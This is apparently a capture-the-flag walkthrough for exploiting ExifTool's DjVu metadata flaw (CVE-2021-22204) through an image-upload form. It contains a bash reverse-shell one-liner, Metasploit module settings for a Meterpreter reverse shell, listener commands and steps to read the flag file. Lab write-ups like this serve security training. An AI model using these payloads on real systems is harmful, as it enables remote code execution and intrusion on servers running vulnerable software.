Step-by-Step Solution

 Step 1: Initial Observations

Upload a basic image and observe that the server extracts metadata (using ExifTool). Try uploading a renamed `.txt` file or a malformed image — if it still processes them, that’s a big clue that file type validation is weak.

 Step 2: Research the Vulnerability

A quick search for “ExifTool image vulnerability” or “ExifTool exploit” leads to:

> **CVE-2021-22204**: A vulnerability in ExifTool’s DjVu file parser that allows arbitrary code execution via crafted metadata.

This means: if you create a malicious DjVu file (even renamed as `.jpg`), you can get the server to run any shell command.

 Step 3: Craft a Malicious DjVu File

There are three common approaches for generating a payload file. However, reverse shells require a public IP which isn't available to most players, so Option A is recommended.

Option A:

1. Find a CVE proof-of-concept like https://github.com/convisolabs/CVE-2021-22204-exiftool
2. Modify it to generate custom payloads, like `ls /` and `cat /flag.txt`
3. Upload the custom payloads to find and read the flag

 Option B: Manually Embed a Bash Reverse Shell

Use a known one-liner like:

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

Use a DjVu file with a `metadata=` field containing the command above. You can create one using tools like [djvumake](https://djvu.sourceforge.net/) or use crafted samples from exploit repositories.

 Option C: Use Metasploit

Metasploit provides an automated way to generate a malicious DjVu file with any payload:

```bash
msfconsole
```

Then:

```bash
use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
set PAYLOAD cmd/unix/python/meterpreter/reverse_tcp
set LHOST <your IP>
set LPORT 4444
run
```

This generates a malicious `.jpg` file that exploits the vulnerability.


 Step 4: Start a Listener

Depending on the payload:

* For a Bash shell:

  ```bash
  nc -lvnp 4444
  ```

* For a Meterpreter shell:

  ```bash
  use exploit/multi/handler
  set PAYLOAD cmd/unix/python/meterpreter/reverse_tcp
  set LHOST <your IP>
  set LPORT 4444
  run
  ```

 Step 5: Upload the File

Upload your crafted `.jpg` file through the web interface. If successful, ExifTool processes the file and executes your command — giving you a shell on the server.


 Step 6: Retrieve the Flag

In your shell or Meterpreter session, look for the flag:

```bash
find / -name flag.txt 2>/dev/null
```

Then:

```bash
cat /flag.txt
```
